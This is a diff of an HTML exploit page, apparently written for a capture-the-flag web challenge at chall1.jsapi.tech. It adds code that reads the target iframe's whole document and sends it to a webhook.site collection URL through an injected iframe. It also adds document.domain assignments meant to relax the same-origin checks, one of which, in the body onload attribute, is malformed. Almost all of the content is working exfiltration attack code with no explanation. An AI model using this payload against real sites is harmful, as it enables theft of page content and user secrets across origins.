@@ -13,10 +13,14 @@
                 });
                 let target = document.getElementById("target");
                 target.contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "*");
+                let iframe_html = document.createElement("iframe");
+                iframe_html.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/" + encodeURIComponent(target.contentWindow.document.documentElement.outerHTML);
+                document.body.appendChild(iframe_html);
             }
+            document.domain = "chall1.jsapi.tech";
         </script>
     </head>
-    <body>
-        <iframe id="target" src="https://chall1.jsapi.tech/?enableapi=true&recv=https://ctf0.jsapi.tech/" onload="start_attack()"></iframe>
+    <body onload="document.domain = 'https://chall1.jsapi.tech'">
+        <iframe id="target" src="https://chall1.jsapi.tech/?enableapi=true&recv=https://ctf0.chall.jsapi.tech/" onload="start_attack()"></iframe>
     </body>
 </html>
